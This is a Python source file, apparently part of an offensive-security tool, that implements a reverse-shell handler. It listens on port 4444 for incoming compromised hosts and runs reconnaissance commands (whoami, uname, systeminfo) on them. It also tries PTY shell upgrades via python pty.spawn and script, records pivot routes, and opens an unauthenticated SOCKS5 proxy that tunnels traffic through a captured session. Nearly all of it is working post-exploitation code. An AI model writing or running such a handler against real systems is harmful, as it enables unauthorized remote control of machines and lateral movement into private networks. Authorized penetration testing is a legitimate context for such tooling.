from __future__ import annotations

import asyncio
import uuid
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any

from alma.utils.errors import SessionError
from alma.utils.logger import AlmaLogger


HEARTBEAT_INTERVAL = 15.0
HEARTBEAT_MISSED_LIMIT = 2


PTY_UPGRADE_COMMANDS = [
    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null",
    "python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null",
    "script -qc /bin/bash /dev/null 2>/dev/null",
    "stty raw -echo; cat",
]

FALLBACK_COMMANDS: dict[str, list[str]] = {
    "whoami": [
        "whoami 2>/dev/null",
        "id -un 2>/dev/null",
        "cmd /c whoami 2>nul",
        "echo %USERNAME%",
    ],
    "os": [
        "uname -a 2>/dev/null",
        "cat /etc/os-release 2>/dev/null | head -1",
        "ver 2>nul",
        "systeminfo 2>nul | findstr /B OS",
    ],
    "arch": [
        "uname -m 2>/dev/null",
        "arch 2>/dev/null",
        "echo %PROCESSOR_ARCHITECTURE%",
    ],
}


@dataclass
class PivotRoute:
    subnet: str
    via_session_id: str
    hops: int = 1

    def matches(self, ip: str) -> bool:
        return ip.startswith(self.subnet.rstrip("0."))


@dataclass
class Session:
    id: str
    target_host: str
    target_port: int
    protocol: str
    reader: asyncio.StreamReader | None = None
    writer: asyncio.StreamWriter | None = None
    pid: int | None = None
    username: str | None = None
    integrity: str = "user"
    degraded: bool = False
    degraded_reason: str = ""
    reconnect_token: str | None = None
    created_at: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
    metadata: dict[str, Any] = field(default_factory=dict)
    pivots: list[PivotRoute] = field(default_factory=list)

    _lock: asyncio.Lock = field(default_factory=asyncio.Lock, repr=False)
    _heartbeat_task: asyncio.Task | None = field(default=None, repr=False)
    _last_heartbeat: float = field(default_factory=lambda: __import__("time").time(), repr=False)

    @property
    def transport(self) -> Any:
        return self.writer

    def lock(self) -> asyncio.Lock:
        return self._lock

    def is_alive(self) -> bool:
        if self.writer is None:
            return False
        elapsed = __import__("time").time() - self._last_heartbeat
        if self._heartbeat_task and elapsed > HEARTBEAT_INTERVAL * HEARTBEAT_MISSED_LIMIT:
            return False
        return True

    def mark_heartbeat(self) -> None:
        self._last_heartbeat = __import__("time").time()

    async def start_heartbeats(self) -> None:
        if self._heartbeat_task and not self._heartbeat_task.done():
            return

        async def _beat():
            while True:
                try:
                    await self.send("echo 1", timeout=5.0)
                    self.mark_heartbeat()
                except (SessionError, ConnectionError, OSError):
                    break
                await asyncio.sleep(HEARTBEAT_INTERVAL)

        self._heartbeat_task = asyncio.create_task(_beat())

    async def stop_heartbeats(self) -> None:
        if self._heartbeat_task:
            self._heartbeat_task.cancel()
            try:
                await self._heartbeat_task
            except (asyncio.CancelledError, Exception):
                pass
            self._heartbeat_task = None

    async def send(self, command: str, timeout: float = 10.0) -> str:
        if not self.writer:
            raise SessionError("Session transport is closed")
        async with self._lock:
            try:
                self.writer.write(f"{command}\n".encode())
                await asyncio.wait_for(self.writer.drain(), timeout=timeout)
                chunks: list[bytes] = []
                while True:
                    chunk = await asyncio.wait_for(self.reader.read(65536), timeout=timeout) if self.reader else b""
                    if not chunk:
                        break
                    chunks.append(chunk)
                    if len(b"".join(chunks)) >= 262144:
                        break
                data = b"".join(chunks)
                return data.decode(errors="replace")
            except asyncio.TimeoutError:
                if chunks:
                    return b"".join(chunks).decode(errors="replace")
                raise SessionError(f"Command timed out after {timeout}s")

    async def send_with_fallback(self, command_key: str, timeout: float = 10.0) -> str | None:
        commands = FALLBACK_COMMANDS.get(command_key)
        if not commands:
            return None
        for cmd in commands:
            try:
                result = await self.send(cmd, timeout=timeout)
                if result and "not recognized" not in result and "not found" not in result:
                    return result.strip()
            except (SessionError, OSError):
                continue
        return None

    async def attempt_pty_upgrade(self) -> bool:
        for cmd in PTY_UPGRADE_COMMANDS:
            try:
                await self.send(cmd, timeout=3.0)
                result = await self.send("stty size 2>/dev/null; echo PTY_OK", timeout=3.0)
                if "PTY_OK" in result:
                    return True
            except (SessionError, OSError):
                continue
        return False

    async def diagnose_degraded(self) -> None:
        whoami = await self.send_with_fallback("whoami", timeout=5.0)
        if whoami:
            self.username = whoami
        else:
            self.degraded = True
            self.degraded_reason = "cannot execute basic commands"

        os_info = await self.send_with_fallback("os", timeout=5.0)
        if os_info:
            self.metadata["os"] = os_info.lower()

        arch_info = await self.send_with_fallback("arch", timeout=5.0)
        if arch_info:
            self.metadata["arch"] = arch_info

        pty_ok = await self.attempt_pty_upgrade()
        if not pty_ok:
            self.degraded = True
            self.degraded_reason = "no PTY available"

    async def reconnect(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        self.reader = reader
        self.writer = writer
        self._last_heartbeat = __import__("time").time()
        self.mark_heartbeat()
        if self._heartbeat_task and self._heartbeat_task.done():
            await self.start_heartbeats()

    def add_pivot(self, subnet: str, via: str) -> PivotRoute:
        route = PivotRoute(subnet=subnet, via_session_id=via)
        self.pivots.append(route)
        return route


class SessionManager(ABC):
    def __init__(self) -> None:
        self._sessions: dict[str, Session] = {}
        self._pivot_table: dict[str, list[PivotRoute]] = {}
        self._server: asyncio.AbstractServer | None = None
        self._log = AlmaLogger("session-mgr").get()

    @abstractmethod
    async def listen(self, bind: str = "0.0.0.0", port: int = 4444) -> None:
        ...

    async def register(self, session: Session) -> str:
        if session.id in self._sessions:
            raise SessionError(f"Session {session.id} already registered")
        self._sessions[session.id] = session
        self._log.info("Session registered: %s (%s:%d)", session.id, session.target_host, session.target_port)
        return session.id

    async def unregister(self, session_id: str) -> None:
        s = self._sessions.pop(session_id, None)
        if s:
            self._log.info("Session unregistered: %s", session_id)
            await self.close(s)

    @abstractmethod
    async def close(self, session: Session) -> None:
        ...

    async def send(self, session_id: str, command: str, timeout: float = 30.0) -> str:
        session = self._sessions.get(session_id)
        if not session:
            raise SessionError(f"Unknown session: {session_id}")
        return await session.send(command, timeout=timeout)

    def list_active(self) -> dict[str, Session]:
        return {sid: s for sid, s in self._sessions.items() if s.is_alive()}

    def list_degraded(self) -> dict[str, Session]:
        return {sid: s for sid, s in self._sessions.items() if s.degraded and s.is_alive()}

    def add_pivot_route(self, session_id: str, subnet: str) -> PivotRoute:
        session = self._sessions.get(session_id)
        if not session:
            raise SessionError(f"Cannot pivot — session {session_id} not found")
        route = session.add_pivot(subnet, session_id)
        self._pivot_table.setdefault(subnet, []).append(route)
        self._log.info("Pivot route added: %s via session %s", subnet, session_id)
        return route

    def find_pivot(self, target_ip: str) -> PivotRoute | None:
        for subnet, routes in self._pivot_table.items():
            for route in routes:
                if route.matches(target_ip):
                    return route
        return None

    async def cleanup_all(self) -> None:
        if self._server:
            self._server.close()
            await self._server.wait_closed()
        for sid in list(self._sessions):
            await self.unregister(sid)
        self._log.info("All sessions cleaned up")


class TcpSessionManager(SessionManager):
    async def listen(self, bind: str = "0.0.0.0", port: int = 4444) -> None:
        self._log.info("Starting TCP listener on %s:%d", bind, port)

        async def handle_client(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
            peername = writer.get_extra_info("peername")
            self._log.info("Incoming connection from %s", peername)

            session = Session(
                id=str(uuid.uuid4()),
                target_host=peername[0] if peername else "unknown",
                target_port=peername[1] if peername else 0,
                protocol="reverse-tcp",
                reader=reader,
                writer=writer,
            )

            await self.register(session)
            await session.diagnose_degraded()

            try:
                while True:
                    data = await asyncio.wait_for(reader.read(65536), timeout=300.0)
                    if not data:
                        break
                    self._log.debug("Session %s received %d bytes", session.id, len(data))
            except (asyncio.TimeoutError, ConnectionResetError, BrokenPipeError):
                self._log.info("Session %s dropped (timeout/disconnect)", session.id)
            finally:
                await self.unregister(session.id)
                writer.close()

        self._server = await asyncio.start_server(handle_client, host=bind, port=port)
        self._log.info("Listener active on %s:%d", bind, port)

    async def close(self, session: Session) -> None:
        try:
            if session.writer:
                session.writer.close()
        except Exception as e:
            self._log.warning("Error closing session %s: %s", session.id, e)
        session.writer = None

    async def start_pivot_proxy(
        self, session_id: str, listen_host: str = "127.0.0.1", listen_port: int = 1080
    ) -> int:
        session = self._sessions.get(session_id)
        if not session:
            raise SessionError(f"Cannot proxy — session {session_id} not found")

        async def handle_socks(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
            try:
                ver = await reader.readexactly(1)
                if ver != b"\x05":
                    return
                nauth = (await reader.readexactly(1))[0]
                auth = await reader.readexactly(nauth)
                writer.write(b"\x05\x00")
                await writer.drain()

                req = await reader.readexactly(4)
                cmd = req[1]
                if cmd != 1:
                    writer.write(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")
                    await writer.drain()
                    return

                addr_type = req[3]
                if addr_type == 1:
                    host_bytes = await reader.readexactly(4)
                    dst_host = ".".join(str(b) for b in host_bytes)
                elif addr_type == 3:
                    name_len = (await reader.readexactly(1))[0]
                    dst_host = (await reader.readexactly(name_len)).decode()
                else:
                    return
                dst_port_raw = await reader.readexactly(2)
                dst_port = (dst_port_raw[0] << 8) | dst_port_raw[1]

                cmd_line = f"proxy connect {dst_host} {dst_port}"
                session.writer.write(f"{cmd_line}\n".encode())
                await session.writer.drain()

                writer.write(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
                await writer.drain()

                async def relay(src, dst):
                    try:
                        while True:
                            data = await asyncio.wait_for(src.read(65536), timeout=300.0)
                            if not data:
                                break
                            dst.write(data)
                            await dst.drain()
                    except (asyncio.TimeoutError, ConnectionError):
                        pass

                await asyncio.gather(
                    relay(reader, session.writer),
                    relay(session.reader, writer),
                )
            except Exception as e:
                self._log.debug("SOCKS proxy error: %s", e)
            finally:
                writer.close()

        server = await asyncio.start_server(handle_socks, host=listen_host, port=listen_port)
        self._log.info("SOCKS5 proxy listening on %s:%d → session %s", listen_host, listen_port, session_id)
        return listen_port
